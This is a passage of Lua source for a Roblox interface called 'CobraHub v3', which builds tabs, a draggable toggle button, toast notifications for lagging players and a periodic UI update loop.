        bindAccent(s, "Color")
        bgStrokes[i] = s

        local num = label(b, {
            Size = UDim2.new(0, 20, 0, 14),
            Position = UDim2.new(0, 4, 0, 4),
            BackgroundColor3 = Color3.new(0, 0, 0),
            BackgroundTransparency = 0.4,
            Text = tostring(i),
            Font = Enum.Font.GothamBold,
            TextSize = 10,
            TextXAlignment = Enum.TextXAlignment.Center,
        })
        corner(num, 4)

        b.MouseButton1Click:Connect(function()
            config.bg = i
            BgImage.Image = asset
            for j, st in ipairs(bgStrokes) do
                tween(st, 0.15, { Transparency = (j == i) and 0 or 1 })
            end
            saveConfig()
        end)
    end
end

local pages = {}
for i = 1, #TABS do
    pages[i] = newPage()
end

buildHome(pages[1])
buildDetect(pages[2])
buildStyle(pages[3])

local tabButtons = {}

local function selectTab(i)
    for idx, p in ipairs(pages) do
        p.Visible = (idx == i)
    end
    for idx, b in ipairs(tabButtons) do
        tween(b, 0.15, { TextColor3 = (idx == i) and TEXT or MUTED })
    end
    tween(Underline, 0.2, { Position = UDim2.new((i - 1) / #TABS, 0, 1, -2) })
end

for i, name in ipairs(TABS) do
    local b = make("TextButton", {
        Size = UDim2.new(1 / #TABS, 0, 1, -2),
        Position = UDim2.new((i - 1) / #TABS, 0, 0, 0),
        BackgroundTransparency = 1,
        Text = name,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextColor3 = MUTED,
    }, TabBar)
    tabButtons[i] = b
    b.MouseButton1Click:Connect(function()
        selectTab(i)
    end)
end

selectTab(1)

local Pill = make("TextButton", {
    Name = "OpenPill",
    Size = UDim2.new(0, 96, 0, 30),
    Position = UDim2.new(0, 16, 0.5, -15),
    BackgroundColor3 = Color3.fromRGB(18, 18, 24),
    Text = "COBRAHUB",
    Font = Enum.Font.GothamBold,
    TextSize = 11,
    TextColor3 = TEXT,
    TextXAlignment = Enum.TextXAlignment.Left,
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Visible = false,
}, ScreenGui)
corner(Pill, 15)
stroke(Pill, Color3.fromRGB(255, 255, 255), 0.8, 1)
make("UIPadding", { PaddingLeft = UDim.new(0, 30) }, Pill)

local PillDot = make("Frame", {
    Size = UDim2.new(0, 10, 0, 10),
    Position = UDim2.new(0, -20, 0.5, -5),
    BackgroundColor3 = GOOD,
    BorderSizePixel = 0,
}, Pill)
corner(PillDot, 5)

local pillWasDragged = makeDraggable(Pill, Pill)

local ToastHolder = make("Frame", {
    Size = UDim2.new(0, 260, 0, 200),
    AnchorPoint = Vector2.new(0.5, 0),
    Position = UDim2.new(0.5, 0, 0, 14),
    BackgroundTransparency = 1,
}, ScreenGui)
make("UIListLayout", {
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder,
    HorizontalAlignment = Enum.HorizontalAlignment.Center,
}, ToastHolder)

local function toast(text, color)
    local f = make("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        BackgroundColor3 = Color3.fromRGB(24, 24, 32),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
    }, ToastHolder)
    corner(f, 8)
    local s = stroke(f, color, 1, 1)
    local l = label(f, {
        Size = UDim2.new(1, -16, 1, 0),
        Position = UDim2.new(0, 8, 0, 0),
        Text = text,
        TextColor3 = color,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextTransparency = 1,
        TextTruncate = Enum.TextTruncate.AtEnd,
    })

    tween(f, 0.2, { BackgroundTransparency = 0.1 })
    tween(s, 0.2, { Transparency = 0.3 })
    tween(l, 0.2, { TextTransparency = 0 })

    task.delay(3.5, function()
        tween(f, 0.25, { BackgroundTransparency = 1 })
        tween(s, 0.25, { Transparency = 1 })
        tween(l, 0.25, { TextTransparency = 1 })
        task.delay(0.3, function()
            f:Destroy()
        end)
    end)
end

state.onFlag = function(plr)
    if state.Alerts then
        toast("LAG ALERT: " .. plr.DisplayName, BAD)
    end
end

local menuOpen = true

local function setMenuVisible(v)
    if v == menuOpen then return end
    menuOpen = v
    if v then
        Pill.Visible = false
        Root.Visible = true
        OpenScale.Scale = 0.85
        tween(OpenScale, 0.22, { Scale = 1 }, Enum.EasingStyle.Back)
    else
        tween(OpenScale, 0.15, { Scale = 0.85 })
        task.delay(0.15, function()
            if not menuOpen then
                Root.Visible = false
                Pill.Visible = true
            end
        end)
    end
end

CloseBtn.MouseButton1Click:Connect(function()
    setMenuVisible(false)
end)

Pill.MouseButton1Click:Connect(function()
    if pillWasDragged() then return end
    setMenuVisible(true)
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        setMenuVisible(not menuOpen)
    end
end)

updaters[#updaters + 1] = function()
    if state.selfLagging then
        PillDot.BackgroundColor3 = WARN
    elseif #state.laggers > 0 then
        PillDot.BackgroundColor3 = BAD
    else
        PillDot.BackgroundColor3 = GOOD
    end
end

local acc = 0
RunService.Heartbeat:Connect(function(dt)
    acc += dt
    if acc < 0.25 then return end
    acc = 0
    for _, fn in ipairs(updaters) do
        local ok, err = pcall(fn)
        if not ok and state.Log then
            warn("[CobraHub] UI update error: " .. tostring(err))
        end
    end
end)

print("[CobraHub v3] Loaded")
